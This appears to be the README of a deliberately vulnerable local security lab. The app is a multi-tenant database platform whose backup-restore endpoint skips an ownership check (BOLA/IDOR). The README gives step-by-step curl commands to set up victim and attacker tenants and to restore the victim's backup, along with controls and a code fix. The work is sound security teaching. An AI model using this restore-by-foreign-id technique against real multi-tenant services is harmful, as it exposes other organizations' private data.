# Meridian — Cross-Tenant Data Exfiltration via Backup Restore (BOLA)

Meridian is a small multi-tenant **managed-database platform** built for a controlled
Broken-Object-Level-Authorization (BOLA / IDOR) demonstration. Each organization gets
isolated **databases** (which hold record rows), immutable **backups**, and role-scoped
**API keys**.

The platform ships with **no seed data** — you create your own accounts, organizations,
databases, records and backups. To play out the cross-tenant scenario you create two
accounts: a *victim* org and an *attacker* org.

> Do not deploy this project to the public internet. It is intentionally vulnerable and
> built for a local security lab.

## The vulnerability in one sentence

`POST /v1/orgs/{orgId}/databases` lets you restore a new database from a backup via
`sourceBackupId`. The API validates that the backup **exists** but never that it **belongs
to your organization** — so an admin acting inside *their own* tenant can restore another
tenant's backup and read every row (CWE-639).

## Two authentication planes

Meridian separates how **humans** and **machines** authenticate — a normal SaaS shape:

| Plane | Credential | Used by | Where it lives |
|-------|-----------|---------|----------------|
| **Console** | email + password → httpOnly **session cookie** | the web UI | `POST /app/*` |
| **Programmatic API** | `Authorization: Bearer mk_…` **API key** | terminal, scripts, CI | `/v1/*` |

A single account can belong to **several organizations** and must pick which one it is
working in (the org switcher). **API keys are not a login mechanism** — you mint them from
inside the console (**API keys** page) and use them only against `/v1`. Both planes call the
same `/v1` handlers, so the vulnerability below reproduces identically in the browser and in curl.

## Stack

- Node.js + Express backend, CommonJS
- Session cookie auth for the console (scrypt-hashed passwords, no extra deps); Bearer
  API-key auth for `/v1`, roles `admin` / `reader`
- Local JSON storage in `data/db.json` (empty until you sign up)
- Static console SPA served from `public/`

## Run locally

```bash
cd bb-004-cross-tenant-database-exfil
npm install
cp .env.example .env   # optional
npm start
```

Open <http://localhost:5060>. On first run the platform is empty — **Create account** to sign
up, or drive the API directly with the commands below.

## Roles

| Role | Can | Cannot |
|------|-----|--------|
| `admin` | create databases, read/write records, run backups, mint keys, invite (admin or reader) | — |
| `reader` | list databases & backups (metadata), mint **reader** keys, invite **readers** | create databases, **read records**, run backups, mint/invite admins |

Signing up always makes you an `admin` of a brand-new organization. `reader` is the
realistic discovery vector — the read-only key handed to monitoring vendors, BI tools,
contractors and CI that leaks into IaC/CI logs. It can read a backup's id, which is all the
restore bug needs.

> **Self-service keys & invites are intentional, not the bug.** Any member may mint API
> keys and invite teammates, but only ever **at or below their own role** (a reader can
> never mint an admin key or invite an admin). This grants no escalation and a reader
> still cannot read records.

## Reproduction (curl)

Accounts and orgs are created on the **console plane** (`/app`, session cookie); the exploit
is run on the **programmatic plane** (`/v1`, API key). Each side signs up, then mints an API
key from its own session — exactly what the UI's **API keys** page does for you.

```bash
APP="http://localhost:5060/app"
API="http://localhost:5060/v1"
```

### Step 1 — Create the VICTIM account, mint a key, and populate a database

```bash
# sign up (email + password) -> session cookie saved to vj.txt
curl -s -c vj.txt -X POST -H 'Content-Type: application/json' \
  -d '{"name":"Omar Reyes","email":"omar@northstar.test","password":"hunter2pass","orgName":"Northstar Analytics"}' \
  $APP/signup >/dev/null
V_ORG=$(curl -s -b vj.txt $APP/session | jq -r '.activeOrgId')

# mint an admin API key from the session (this is the "API keys" page in the UI)
V_KEY=$(curl -s -b vj.txt -X POST -H 'Content-Type: application/json' \
  -d '{"name":"cli","role":"admin"}' $API/orgs/$V_ORG/keys | jq -r '.key.token')

# from here on, drive the API with the key
V_DB=$(curl -s -X POST -H "Authorization: Bearer $V_KEY" -H 'Content-Type: application/json' \
  -d '{"name":"customer-ledger"}' $API/orgs/$V_ORG/databases | jq -r '.database.id')

# add records (note the marker the attacker should never be able to read)
curl -s -X POST -H "Authorization: Bearer $V_KEY" -H 'Content-Type: application/json' \
  -d '{"fields":{"customer":"Helix Manufacturing","email":"ap@helixmfg.example","note":"CROSS_TENANT_PROOF"}}' \
  $API/orgs/$V_ORG/databases/$V_DB/records >/dev/null
curl -s -X POST -H "Authorization: Bearer $V_KEY" -H 'Content-Type: application/json' \
  -d '{"fields":{"customer":"Brightwater Health","note":"northstar_private_data"}}' \
  $API/orgs/$V_ORG/databases/$V_DB/records >/dev/null

# run a backup and copy its id
V_BACKUP=$(curl -s -X POST -H "Authorization: Bearer $V_KEY" -H 'Content-Type: application/json' \
  -d '{"name":"nightly"}' $API/orgs/$V_ORG/databases/$V_DB/backups | jq -r '.backup.id')
echo "victim backup id: $V_BACKUP"
```

### Step 2 — (Optional) the read-only key is the discovery vector

```bash
# the victim admin mints a read-only key (the kind handed to monitoring/BI/contractors)
R_KEY=$(curl -s -H "Authorization: Bearer $V_KEY" -H 'Content-Type: application/json' \
  -X POST -d '{"name":"PulseWatch Monitoring","role":"reader"}' $API/orgs/$V_ORG/keys | jq -r '.key.token')

# the reader can SEE the backup id...
curl -s -H "Authorization: Bearer $R_KEY" $API/orgs/$V_ORG/databases/$V_DB/backups | jq '.backups[].id'
# ...but gains nothing else:
curl -s -o /dev/null -w "create=%{http_code}\n" -X POST -H "Authorization: Bearer $R_KEY" \
  -H 'Content-Type: application/json' -d '{"name":"x"}' $API/orgs/$V_ORG/databases       # -> 403
curl -s -o /dev/null -w "records=%{http_code}\n" -H "Authorization: Bearer $R_KEY" \
  $API/orgs/$V_ORG/databases/$V_DB/records                                               # -> 403
```

> In the browser this is the **invite** flow: an admin generates a one-time `/join/{code}`
> link, the contractor signs in and is added to the org as a `reader`, then mints their own
> reader key. The outcome is identical — a key that can read a backup id and nothing else.

### Step 3 — Create the ATTACKER account and mint its key

```bash
curl -s -c aj.txt -X POST -H 'Content-Type: application/json' \
  -d '{"name":"Dana Okafor","email":"dana@atlas.test","password":"attacker99","orgName":"Atlas Labs"}' \
  $APP/signup >/dev/null
A_ORG=$(curl -s -b aj.txt $APP/session | jq -r '.activeOrgId')
A_KEY=$(curl -s -b aj.txt -X POST -H 'Content-Type: application/json' \
  -d '{"name":"cli","role":"admin"}' $API/orgs/$A_ORG/keys | jq -r '.key.token')
```

### Step 4 — Controls: the platform *does* know how to authorize objects (as the attacker)

```bash
# random / nonexistent backup id -> 400 (existence IS validated)
curl -s -o /dev/null -w "random=%{http_code}\n" -X POST -H "Authorization: Bearer $A_KEY" \
  -H 'Content-Type: application/json' \
  -d '{"name":"c","sourceBackupId":"11111111-2222-3333-4444-555555555555"}' \
  $API/orgs/$A_ORG/databases

# read victim backup directly -> 404 (cross-tenant reads ARE scoped)
curl -s -o /dev/null -w "read=%{http_code}\n" -H "Authorization: Bearer $A_KEY" \
  $API/orgs/$A_ORG/backups/$V_BACKUP

# sibling projectId from another org -> 403 (ownership IS checked here)
V_PROJ=$(curl -s -H "Authorization: Bearer $V_KEY" $API/orgs/$V_ORG/projects | jq -r '.projects[0].id')
curl -s -o /dev/null -w "project=%{http_code}\n" -X POST -H "Authorization: Bearer $A_KEY" \
  -H 'Content-Type: application/json' \
  -d "{\"name\":\"c\",\"projectId\":\"$V_PROJ\"}" $API/orgs/$A_ORG/databases
```

### Step 5 — THE EXPLOIT: restore the victim's backup into your own org

```bash
NEW_ID=$(curl -s -X POST -H "Authorization: Bearer $A_KEY" -H 'Content-Type: application/json' \
  -d "{\"name\":\"stolen-from-northstar\",\"sourceBackupId\":\"$V_BACKUP\"}" \
  $API/orgs/$A_ORG/databases | jq -r '.database.id')   # -> 201, in the ATTACKER's own org

curl -s -H "Authorization: Bearer $A_KEY" $API/orgs/$A_ORG/databases/$NEW_ID/records | jq '.records[].fields'
# -> includes CROSS_TENANT_PROOF and northstar_private_data — victim's data,
#    read from a database in the attacker's org.
```

## Differential — why it's a bug

| Request (as attacker admin, own org) | Result |
|---|---|
| Restore from **own** backup id | 201 (legitimate) |
| Restore from a **random** backup id | **400** — existence *is* checked |
| **Read** the victim backup directly | **404** — cross-tenant reads *are* scoped |
| Set a cross-tenant **`projectId`** | **403** — sibling ownership *is* checked |
| **Restore from the victim's backup id** | **201, database provisioned with the victim's rows** ← the bug |

The only thing that makes the malicious request valid is that the backup *exists in another
tenant*. The ownership check that protects the sibling `projectId` field and the direct
backup-read path is simply **missing** on `sourceBackupId`.

## Doing it in the browser

1. **Create account** (name, email, password, org "Northstar"). You land in the console as
   admin. **Databases → Provision database** → `customer-ledger`; add records (one
   `field: value` per line — include `note: CROSS_TENANT_PROOF`). **Backups → Back up now**
   and copy the backup id (each backup card has a **Copy id** button).
2. Open the **user menu → Sign out**, then **Create account** again with a different email →
   org "Atlas". (Tip: the top-bar **org switcher** lets one account hold several orgs and
   switch between them — but the exploit needs the attacker to be a *non-member* of the
   victim org, so use two separate accounts.)
3. **Databases → Provision database**: paste Northstar's backup id into *Restore from backup
   id* and submit. The new database shows Northstar's rows, including `CROSS_TENANT_PROOF`.

## Accounts, sessions & keys (no email)

- **Sign up / sign in** with email + password (`POST /app/signup`, `POST /app/login`). This
  issues an httpOnly **session cookie** — the console's only login mechanism.
- **Org switching**: one account can be a member of several organizations and chooses which
  one to act in (`POST /app/session/org`). Create more orgs with **+ Create organization**.
- **API keys** are minted from the **API keys** page (`POST /v1/orgs/{orgId}/keys`) for
  terminal/CI use against `/v1`. Any member can mint keys at or below their own role.
- **Invites**: an admin generates a one-time `/join/{code}` link; the invitee signs in (or
  signs up) and is **added to the org** at the invited role. No email is ever sent.

## Where the flaw lives

`src/server.js`, the `POST /v1/orgs/:orgId/databases` handler:

```js
const backup = db.findBackupById(body.sourceBackupId);   // <-- no orgId scope (the bug)
```

Compare with the safe lookups in `src/db.js`:

- `findProjectInOrg(projectId, orgId)` — used for the sibling `projectId` (→ 403)
- `findBackupInOrg(backupId, orgId)` — used for direct backup reads (→ 404)

## Safe fix direction

Scope the restore resolution to the caller's organization and reject cross-org references:

```js
const backup = db.findBackupInOrg(body.sourceBackupId, orgId);
if (!backup) {
  return res.status(404).json({ error: 'Backup not found.', code: 'NOT_FOUND' });
}
```

More broadly: enforce object-level authorization on **every** user-supplied object
reference, not just the obvious ones, and add a regression test per reference.

## Reset

```bash
npm run reset
```

Empties `data/db.json` back to a fresh platform with no tenants or data.
